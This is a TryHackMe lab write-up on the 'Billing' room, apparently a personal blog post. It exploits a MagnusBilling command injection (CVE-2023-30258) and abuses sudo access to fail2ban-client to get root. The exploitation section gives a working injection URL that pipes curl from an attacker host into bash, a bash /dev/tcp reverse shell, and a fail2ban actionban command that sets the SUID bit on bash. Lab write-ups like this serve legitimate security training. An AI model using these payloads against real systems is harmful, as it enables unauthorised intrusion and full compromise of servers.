---
title: TryHackMe | Billing Writeup 
date: 2026-05-16 
categories: [TryHackMe]
tags: [web, "command injection", sudo, fail2ban]     # TAG names should always be lowercase
image:
  path: assets/img/billing/billing-logo-bg.png
description: Exploiting a command injection vulnerability in MagnusBilling and abusing a misconfigured fail2ban setup to achieve root access.
comments: true
---

## 1. Room Info
**Name:** Billing \\
**Platform:** TryHackMe \\
**Difficulty:** Easy \\
**OS:** Linux \\
**Link:** [Billing room on TryHackMe](https://tryhackme.com/room/billing)

## 2. Attack Path Summary

1. Identify MagnusBilling instance via web enumeration  
2. Exploit CVE-2023-30258 (command injection) for initial access  
3. Obtain reverse shell as `asterisk` user  
4. Abuse sudo access to `fail2ban-client`  
5. Modify `actionban` to gain root privileges  

## 3. Reconnaissance
I started with a standard service scan to identify open ports.

``` terminal
kali@kali:~/thm/billing$ nmap -sV -sC <Target-IP> -oN nmap/initial.txt
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-13 15:33 -0400
Nmap scan report for 10.113.141.114
Host is up (0.041s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
| ssh-hostkey: 
|   256 c0:20:51:9c:e5:e4:4d:47:a0:e1:f5:98:79:67:61:cc (ECDSA)
|_  256 53:47:a0:f5:4e:fa:10:3f:0e:19:ae:2b:7f:5f:2c:b6 (ED25519)
80/tcp   open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
| http-title:             MagnusBilling        
|_Requested resource was http://10.113.141.114/mbilling/
| http-robots.txt: 1 disallowed entry 
|_/mbilling/
3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Open ports:
- 22 (SSH)
- 80 (HTTP – Apache 2.4.62)
- 3306 (MariaDB – restricted)

The web server redirects to `/mbilling`, which becomes the primary attack surface.
## 4. Enumeration
I quickly checked the source code of the page but found nothing useful. Note, the server immediately redirects to `/mbilling`.
![homepage](assets/img/billing/1-homepage.png)
Time to start a directory scan with `gobuster` using `dirb/common.txt`.
```bash
gobuster dir -u http://<Target-IP> -w /usr/share/wordlists/dirb/common.txt -x php,html,bak 
```
These were the accessible resources:
```
index.php            (Status: 302) [Size: 1] [--> ./mbilling]
index.php            (Status: 302) [Size: 1] [--> ./mbilling]
robots.txt           (Status: 200) [Size: 37]
```
I started a scan with the same parameters on `/mbilling`.
```
archive              (Status: 301) [Size: 327] [--> http://10.113.141.114/mbilling/archive/]
assets               (Status: 301) [Size: 326] [--> http://10.113.141.114/mbilling/assets/]
cron.php             (Status: 200) [Size: 0]
fpdf                 (Status: 301) [Size: 324] [--> http://10.113.141.114/mbilling/fpdf/]
index.html           (Status: 200) [Size: 30760]
index.php            (Status: 200) [Size: 663]
index.html           (Status: 200) [Size: 30760]
index.php            (Status: 200) [Size: 663]
lib                  (Status: 301) [Size: 323] [--> http://10.113.141.114/mbilling/lib/]
LICENSE              (Status: 200) [Size: 7652]
resources            (Status: 301) [Size: 329] [--> http://10.113.141.114/mbilling/resources/]
tmp                  (Status: 301) [Size: 323] [--> http://10.113.141.114/mbilling/tmp/]
```
I found nothing that might be of any help. Particularly, I was looking for version information or any leaked credentials or backup files.

I tried connecting to MariaDB but the server is refusing connection to anyone that is not on the white-list. Then, I scanned all ports and found Asterisk service running on port 5038.

Initial enumeration of MySQL and Asterisk services did not yield viable attack paths, so focus shifted back to the web application. It turned out there was a `/mbilling/README.md` file where the version of MagnusBilling was specified.  

![magnusbilling version](assets/img/billing/2-version.png)
## 5. Vulnerability Analysis
![cve](assets/img/billing/3-cve.png)

[CVE-2023-30258](https://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2023-30258) revealed that MagnusBilling 7.x allows for command injection. The vulnerability allows an unauthenticated user to execute arbitrary OS commands on the host, with the privileges of the web server. On [Albin Eldstål-Ahrens - CVE-2023-30258 Security advisory](https://eldstal.se/advisories/230327-magnusbilling.html) it is mentioned that in `lib/icepay/icepay.php`, `exec()` call expects a GET parameter `democ` that is controlled by the user. In practical terms it means that anyone can execute system commands on the target machine by specifying `?democ=<command>` in the url. 

## 6. Exploitation
So I tried to get a reverse shell. After trying some options, the one that worked was by using `curl`-based payload:
```bash
curl http://<Your-IP>/shell.sh | bash
```

The reverse shell that I used:
```bash
#!/bin/bash
bash -i >& /dev/tcp/<Your-IP>/7777 0>&1
```

I started a Python web server using the following command to host my `shell.sh`:
```bash
python3 -m http.server 80
```

I also set up a netcat listener via:
```bash
nc -lvnp 7777
``` 
The final url would be the following. Note, for the command to work, semicolon `;` is expected at the end:

```
http://<Target-IP>/mbilling/lib/icepay/icepay.php?democ=/dev/null;curl+http://<Your-IP>/shell.sh+|+bash;
```

Time to upgrade the shell.

```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
Ctrl+Z
stty raw -echo;fg
*ENTER second time*
```
![user-flag](assets/img/billing/4-user-flag.png)
## 7. Privilege Escalation
Checking `sudo` privileges revealed that `asterisk` user had unlimited access to `fail2ban`. After confirming there were no suspicious SUID binaries or cron jobs, I began my inspection of how `fail2ban` can be abused to gain elevated privileges. `fail2ban` is a log-monitoring service that executes predefined actions (e.g., firewall rules) when suspicious activity is detected.

![sudo](assets/img/billing/5-sudo.png)
By running the following command, I was able to get the help menu with explanations of available commands:

```
sudo /usr/bin/fail2ban-client
```

For example, `banned` command showed `fail2ban` jails and banned IPs in that jails. Currently each one was empty:

```terminal
asterisk@ip-10-114-169-128:/etc/fail2ban$ sudo /usr/bin/fail2ban-client banned
[{'sshd': []}, {'asterisk-iptables': []}, {'ast-cli-attck': []}, {'asterisk-manager': []}, {'ast-hgc-200': []}, {'mbilling_login': []}, {'ip-blacklist': []}, {'mbilling_ddos': []}]
```

`fail2ban` has config files that specify its behavior. `/etc/fail2ban/jail.conf` is the primary configuration file in which global settings are stored. It also contains references to action configuration files at `/etc/fail2ban/action.d/`, which store actions to be executed upon some events. If `asterisk` user had write permissions in `/etc/fail2ban/action.d/`, I would be able to edit the action config files to execute malicious commands. However, this is not the case, so I had to modify actions taken through `fail2ban` CLI. Each **Action** stores commands to be executed at specific stages of `fail2ban` lifecycle. One of them is `actionban` which defines how a malicious IP is blocked. Since `asterisk` has carte blanche on `fail2ban`, I am able to edit `actionban` in the action file used by any of the jails. This misconfiguration is critical because `fail2ban` executes its actions with `root` privileges. Allowing a low-privileged user to modify these actions effectively grants arbitrary command execution as `root`. 

![action](assets/img/billing/6-action.png)

First, I retrieved the action used by `mbilling_login` jail (remember the login form?). 
```terminal
asterisk@ip-10-114-169-128:/etc/fail2ban$ sudo /usr/bin/fail2ban-client get mbilling_login actions
The jail mbilling_login has the following actions:
iptables-allports
```

Then, I modified `actionban` to execute `chmod +s /usr/bin/bash` which sets a `SUID bit` for `bash`. Now, when `/usr/bin/bash` is run, it is executed with the permissions of the file owner, which is `root`.
```bash
sudo /usr/bin/fail2ban-client set mbilling_login action iptables-allports actionban "chmod +s /usr/bin/bash"
```
Now, to trigger `actionban`, try to login a couple of times on the website homepage. 
![trigger actionban](assets/img/billing/7-trigger.png)

The only thing left was to run `bash` with `-p` flag to prevent the system from dropping `root` privileges:
```bash 
/usr/bin/bash -p
```
![root flag](assets/img/billing/8-root-flag.png)